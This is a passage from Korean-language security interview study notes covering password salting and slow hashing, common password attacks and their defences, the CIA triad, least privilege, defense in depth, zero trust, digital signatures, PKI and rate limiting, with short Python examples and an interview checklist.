   | 1       | x7Gh9kL2 | $2b$12$abc123...            |
   | 2       | Pq3Rt5Uv | $2b$12$xyz789...            |
```

### 솔트(Salt)의 역할 ◑

솔트는 각 비밀번호에 추가되는 **랜덤 문자열**이다.

**솔트가 없을 때 문제 - 레인보우 테이블 공격**

```
공격자가 미리 계산해둔 해시 테이블:
"password123" → "5f4dcc3b5aa765d61d8327deb882cf99"
"qwerty"      → "d8578edf8458ce06fbc5bb76a58c5ca4"
"abc123"      → "e99a18c428cb38d5f260853678922e03"
... (수십억 개)

DB 유출 시:
해시 "5f4dcc3b5aa765d61d8327deb882cf99" → 원본 "password123" 즉시 찾음
```

**솔트 사용 시**

```
같은 비밀번호라도 솔트가 다르면 해시가 다름:
"password123" + "salt1" → "a1b2c3d4..."
"password123" + "salt2" → "e5f6g7h8..."

레인보우 테이블 무력화:
- 모든 가능한 솔트에 대해 테이블 생성해야 함
- 사실상 불가능
```

### 느린 해시 함수 (Key Derivation Functions) ◑

일반 해시(SHA-256)는 속도가 빠르다. 이는 **브루트 포스 공격에 취약**하다는 의미이다.

```
GPU로 SHA-256 해시 속도: 초당 수십억 개

8자리 숫자+영문 비밀번호 조합: 약 2조 개
→ 수 분 ~ 수 시간 내에 모든 조합 시도 가능
```

**비밀번호용 해시 함수**는 의도적으로 느리게 설계되어 브루트 포스를 어렵게 만든다.

| 알고리즘 | 특징 | 권장 설정 |
|----------|------|----------|
| bcrypt | 비용(cost) 파라미터로 속도 조절 | cost=12 이상 |
| scrypt | 메모리 사용량도 증가 | N=2^14, r=8, p=1 |
| Argon2 | 최신, Password Hashing Competition 우승 | **현재 가장 권장** |

```python
# bcrypt 예시 (Python)
import bcrypt

# 해시 생성 (솔트 자동 포함)
password = "mypassword123".encode()
hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))
# 결과: $2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/X4U.DG8nrr4mKUMve

# 검증
if bcrypt.checkpw(password, hashed):
    print("비밀번호 일치")
```

### 비밀번호 공격 유형과 방어 ◑

| 공격 | 설명 | 방어 |
|------|------|------|
| **브루트 포스** | 모든 조합 시도 | 느린 해시, 계정 잠금, Rate Limiting |
| **딕셔너리 공격** | 흔한 비밀번호 목록 시도 | 복잡한 비밀번호 정책, 흔한 비밀번호 차단 |
| **레인보우 테이블** | 미리 계산된 해시 조회 | 솔트 사용 |
| **크리덴셜 스터핑** | 유출된 ID/PW 재사용 시도 | MFA, 비밀번호 재사용 금지, 유출 DB 확인 |
| **피싱** | 가짜 사이트로 비밀번호 탈취 | 보안 교육, WebAuthn/Passkey |

---

## 7. 보안 원칙 ◑

### CIA Triad ◑

정보 보안의 세 가지 핵심 목표이다.

```
            Confidentiality
                 (기밀성)
                    △
                   /  \
                  /    \
                 /      \
                /________\
         Integrity    Availability
          (무결성)       (가용성)
```

| 원칙 | 설명 | 위협 예시 | 대응 |
|------|------|----------|------|
| **C**onfidentiality | 인가된 사용자만 접근 | 도청, 데이터 유출 | 암호화, 접근 제어 |
| **I**ntegrity | 데이터 변조 방지 | 중간자 공격, 위변조 | 해시, 전자서명 |
| **A**vailability | 필요 시 접근 가능 | DDoS, 랜섬웨어 | 이중화, 백업 |

### 최소 권한 원칙 (Principle of Least Privilege) ◑

> "사용자나 프로세스에게 **작업에 필요한 최소한의 권한만** 부여한다."

```
❌ 잘못된 예:
- 모든 개발자에게 프로덕션 DB root 권한 부여
- 웹 서버 프로세스를 root로 실행
- 모든 API에 관리자 토큰 사용

✅ 올바른 예:
- 개발자는 개발 DB만 접근, 프로덕션은 읽기 전용
- 웹 서버는 전용 계정으로 실행, 필요한 포트만 접근
- API별로 필요한 권한만 가진 토큰 발급
```

### 심층 방어 (Defense in Depth) ◑

> "단일 보안 장치에 의존하지 않고, **여러 계층의 보안**을 배치한다."

```
┌─────────────────────────────────────────────────────────┐
│                     인터넷                              │
└───────────────────────┬─────────────────────────────────┘
                        ↓
              ┌─────────────────┐
              │    방화벽 (L3)   │  ← 1층: 네트워크 필터링
              └────────┬────────┘
                       ↓
              ┌─────────────────┐
              │    WAF (L7)      │  ← 2층: 애플리케이션 필터링
              └────────┬────────┘
                       ↓
              ┌─────────────────┐
              │   인증/인가      │  ← 3층: 접근 제어
              └────────┬────────┘
                       ↓
              ┌─────────────────┐
              │   암호화        │  ← 4층: 데이터 보호
              └────────┬────────┘
                       ↓
              ┌─────────────────┐
              │    로깅/모니터링 │  ← 5층: 탐지 및 대응
              └─────────────────┘
```

한 계층이 뚫려도 다른 계층이 방어한다.

### Zero Trust 보안 모델 ◑

> "**아무도 신뢰하지 않는다** (Never Trust, Always Verify)"

기존 모델: 네트워크 경계(방화벽) 안쪽은 신뢰
Zero Trust: 내부/외부 구분 없이 모든 접근을 검증

```
기존 경계 보안:              Zero Trust:
┌──────────────────┐        ┌──────────────────┐
│    신뢰 영역      │        │                  │
│  (내부 네트워크)   │        │  모든 접근에     │
│   ┌──┐ ┌──┐     │        │  인증 + 인가      │
│   │  │ │  │     │        │  + 암호화 필요    │
│   └──┘ └──┘     │        │                  │
└──────────────────┘        └──────────────────┘
      ↑                           ↑
  방화벽만 통과하면            매번 검증
  내부는 자유롭게
```

**Zero Trust 핵심 원칙**
1. 모든 리소스 접근에 인증/인가 필요
2. 최소 권한 접근
3. 네트워크 위치가 아닌 사용자/기기 기반 신뢰
4. 모든 트래픽 암호화
5. 지속적인 모니터링

---

## 8. 추가 보안 개념 ◑

### 전자서명 (Digital Signature) ◑

전자서명은 **개인키로 서명**하고 **공개키로 검증**하는 방식이다.

```
[서명 과정]
1. 원본 메시지의 해시 계산
   hash = SHA256(message)

2. 해시를 개인키로 암호화 (서명)
   signature = encrypt(hash, private_key)

3. 메시지 + 서명 전송

[검증 과정]
1. 서명을 공개키로 복호화
   received_hash = decrypt(signature, public_key)

2. 원본 메시지의 해시 계산
   calculated_hash = SHA256(message)

3. 두 해시 비교
   if received_hash == calculated_hash:
       서명 유효 (무결성 + 인증 확인)
```

**전자서명이 보장하는 것**
- **무결성**: 메시지가 변조되지 않음
- **인증**: 개인키 소유자만 서명 가능
- **부인 방지**: 서명자가 "나는 서명한 적 없다"고 부인할 수 없음

### 공개키 기반 구조 (PKI) ◑

PKI는 공개키의 진위를 보증하는 **신뢰 체계**이다.

**문제: 중간자 공격 (Man-in-the-Middle)**
```
Alice                     Eve                      Bob
  │ ─── "내 공개키: A" ────→│                        │
  │                       │ ─── "내 공개키: E" ────→│
  │                       │                        │
  │ ←── "Bob 공개키: E" ──│←── "Bob 공개키: B" ────│

Bob은 Eve의 공개키를 Bob의 것으로 믿게 됨
```

**해결: 인증 기관(CA)의 서명**
```
1. Bob의 공개키를 CA에 등록
2. CA가 Bob의 공개키에 서명 (인증서 발급)
3. Alice는 CA의 공개키(신뢰됨)로 Bob 인증서 검증
4. 검증 성공 → Bob의 공개키 신뢰
```

### Rate Limiting ◑

단위 시간당 요청 수를 제한하여 **브루트 포스**, **DDoS** 등을 방어한다.

```python
# 간단한 Rate Limiting 개념
LIMIT = 100  # 분당 100회
window = {}

def check_rate_limit(user_id):
    current_minute = get_current_minute()
    key = f"{user_id}:{current_minute}"

    count = window.get(key, 0)
    if count >= LIMIT:
        return 429  # Too Many Requests

    window[key] = count + 1
    return 200
```

**일반적인 제한 기준**
- 로그인 시도: 5회/분 (계정당)
- API 요청: 1000회/시간 (토큰당)
- 비밀번호 재설정: 3회/시간 (이메일당)

---

## 면접 대비 체크리스트 ◑

- [ ] 대칭키 vs 비대칭키 암호화 차이와 각각의 사용 사례
- [ ] 하이브리드 암호화가 필요한 이유
- [ ] 해시와 암호화의 근본적인 차이 (단방향 vs 양방향)
- [ ] 인증(Authentication) vs 인가(Authorization)
- [ ] 세션 기반 vs 토큰 기반 인증의 장단점
- [ ] JWT의 구조와 보안 주의사항 (Payload 암호화 안 됨)
- [ ] OAuth 2.0의 동작 원리
- [ ] SQL Injection 공격 원리와 Prepared Statement로 방어하는 이유
- [ ] XSS 유형(Stored, Reflected, DOM)과 방어 방법
- [ ] CSRF 공격 원리와 CSRF 토큰의 역할
- [ ] HTTPS/TLS가 제공하는 세 가지 (기밀성, 무결성, 인증)
- [ ] 비밀번호 저장 시 솔트와 느린 해시가 필요한 이유
- [ ] CIA Triad (기밀성, 무결성, 가용성)
- [ ] 최소 권한 원칙과 심층 방어

